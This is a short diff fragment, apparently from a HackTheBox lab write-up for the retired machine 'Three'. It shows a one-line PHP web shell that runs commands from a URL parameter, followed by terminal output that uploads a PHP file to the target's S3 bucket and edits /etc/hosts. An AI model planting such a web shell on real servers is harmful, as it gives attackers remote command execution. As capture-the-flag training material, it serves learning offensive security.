@@ -60,3 +60,19 @@ https://github.com/cspshivam/webshells
 <?php system($_GET['cmd']); ?>
 
 ```
+
+
+```
+┌──(kali㉿kali)-[~]
+└─$ aws --endpoint=http://s3.thetoppers.htb s3 cp /home/kali/Desktop/HackTheBox/Retired\ Machines/Three/ignore.php s3://thetoppers.htb
+upload: Desktop/HackTheBox/Retired Machines/Three/ignore.php to s3://thetoppers.htb/ignore.php
+
+
+# switching /etc/hosts back
+┌──(kali㉿kali)-[~]
+└─$ cat /etc/hosts | grep toppers
+#10.129.227.248   s3.thetoppers.htb
+10.129.227.248   thetoppers.htb
+
+
+```
